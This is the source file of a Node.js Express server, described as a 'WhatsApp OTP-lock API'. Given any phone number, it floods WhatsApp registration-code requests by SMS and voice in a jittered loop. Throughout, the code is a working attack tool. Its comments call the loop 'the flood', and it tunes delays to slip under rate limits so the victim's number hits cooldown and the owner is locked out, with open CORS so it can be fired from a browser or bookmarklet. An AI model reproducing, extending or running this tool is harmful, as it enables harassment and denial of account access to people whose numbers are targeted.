// server.mjs
// WhatsApp OTP-lock API — single GET surface, number in query string.
// Language: JavaScript — Node 18+, ESM.
//
//   GET /api?number=15551234567&key=SECRET
//   GET /api?number=15551234567&key=SECRET&mode=both&rounds=6
//
// Fires the flood inline. No job queue, no polling. Response returns when
// the loop finishes or a cooldown error breaks it. Auth accepts the key
// as ?key= OR X-API-Key header — query param for curl/browser, header
// for scripts.
//
// Env: API_KEY (required), PORT, MIN_JITTER_MS, NUMBER_COOLDOWN_MS
//
// Direct egress — no proxy rotation. Per-IP limiter is the ceiling.

import express from 'express'
import pino from 'pino'
import { setTimeout as sleep } from 'node:timers/promises'

// -- registration loader -----------------------------------------------------

async function loadRegistration() {
  const candidates = [
    '@whiskeysockets/baileys/lib/Mobile/mobile.js',
    '@whiskeysockets/baileys/lib/Mobile/mobile',
    '@whiskeysockets/baileys',
    '@adiwajshing/baileys',
  ]
  for (const path of candidates) {
    try {
      const mod = await import(path)
      if (typeof mod.requestRegistrationCode === 'function') return mod.requestRegistrationCode
    } catch {}
  }
  throw new Error('requestRegistrationCode not exported — pin @whiskeysockets/baileys ^6.7')
}

// -- config ------------------------------------------------------------------

const PORT         = process.env.PORT || 3000
const API_KEY      = process.env.API_KEY
const MIN_JITTER   = Math.max(1000, Number(process.env.MIN_JITTER_MS || 8000))
const NUM_COOLDOWN = Math.max(0, Number(process.env.NUMBER_COOLDOWN_MS || 30 * 60 * 1000))
const MAX_ROUNDS   = 20

if (!API_KEY) {
  console.error('API_KEY env is required — refusing to start')
  process.exit(1)
}

const log = pino({ level: process.env.LOG_LEVEL || 'info' })

// -- state -------------------------------------------------------------------

const lastFired = new Map()   // number → ts

function pruneCooldowns() {
  const cutoff = Date.now() - NUM_COOLDOWN
  for (const [num, t] of lastFired) if (t < cutoff) lastFired.delete(num)
}

const pickMethod = (mode, round) => mode === 'both'
  ? (round % 2 === 0 ? 'voice' : 'sms')
  : mode

// -- the flood ---------------------------------------------------------------

async function runLock(requestRegistrationCode, { number, mode, rounds, jitterMs }) {
  const effJitter = Math.max(jitterMs, MIN_JITTER)
  const shots = []
  let cooldownHit = false

  for (let i = 1; i <= rounds; i++) {
    const method = pickMethod(mode, i)
    const t0 = Date.now()
    try {
      const res = await requestRegistrationCode(number, method, { logger: log })
      shots.push({
        round: i, method, ok: true, ms: Date.now() - t0,
        res: String(JSON.stringify(res)).slice(0, 200),
      })
      lastFired.set(number, Date.now())
    } catch (err) {
      const msg = err?.message || String(err)
      shots.push({ round: i, method, ok: false, ms: Date.now() - t0, err: msg })
      if (/too_recent|too_many|blocked|rate|flood/i.test(msg)) {
        cooldownHit = true
        break
      }
    }
    if (i < rounds) await sleep(effJitter + Math.random() * effJitter)
  }

  const delivered = shots.filter(s => s.ok).length
  const errors    = shots.filter(s => !s.ok).length

  return { shots, delivered, errors, cooldownHit, effectiveJitterMs: effJitter }
}

// -- http --------------------------------------------------------------------

const requestRegistrationCode = await loadRegistration()
log.info('baileys registration function loaded — direct egress')

const app = express()

// CORS — flip on so a browser or a bookmarklet can hit it
app.use((req, res, next) => {
  res.set('Access-Control-Allow-Origin', '*')
  res.set('Access-Control-Allow-Headers', 'x-api-key, content-type')
  res.set('Access-Control-Allow-Methods', 'GET, OPTIONS')
  if (req.method === 'OPTIONS') return res.sendStatus(204)
  next()
})

// health — outside the key gate
app.get('/', (_req, res) => {
  pruneCooldowns()
  res.json({ ok: true, service: 'wa-otp-lock-api', surface: 'GET /api?number=', numbersInCooldown: lastFired.size })
})

app.get('/api', async (req, res) => {
  // auth — ?key= or X-API-Key header
  const key = req.query.key || req.get('x-api-key')
  if (key !== API_KEY) return res.status(401).json({ error: 'unauthorized' })

  const raw    = String(req.query.number || '')
  const clean  = raw.replace(/\D/g, '')
  const mode   = String(req.query.mode || 'sms').toLowerCase()
  const rounds = Math.min(Math.max(1, Number(req.query.rounds) || 4), MAX_ROUNDS)
  const jitter = Math.min(Math.max(MIN_JITTER, Number(req.query.jitter) || MIN_JITTER), 120000)

  if (!/^\d{7,15}$/.test(clean))
    return res.status(400).json({ error: 'number must be E.164 digits (7–15), no +', got: raw })
  if (!['sms', 'voice', 'both'].includes(mode))
    return res.status(400).json({ error: 'mode must be sms | voice | both' })

  pruneCooldowns()
  const last = lastFired.get(clean)
  if (last && Date.now() - last < NUM_COOLDOWN) {
    return res.status(429).json({
      error: 'number in cooldown',
      number: clean,
      remainMs: NUM_COOLDOWN - (Date.now() - last),
    })
  }

  const t0 = Date.now()
  try {
    const result = await runLock(requestRegistrationCode, { number: clean, mode, rounds, jitterMs: jitter })
    res.json({
      ok: result.delivered > 0,
      number: clean,
      mode,
      roundsRequested: rounds,
      delivered: result.delivered,
      errors: result.errors,
      cooldownHit: result.cooldownHit,
      elapsedMs: Date.now() - t0,
      shots: result.shots,
    })
  } catch (err) {
    res.status(500).json({ error: 'run failed', detail: err?.message || String(err) })
  }
})

app.listen(PORT, '0.0.0.0', () => log.info(`listening on 0.0.0.0:${PORT} — GET /api?number=`))
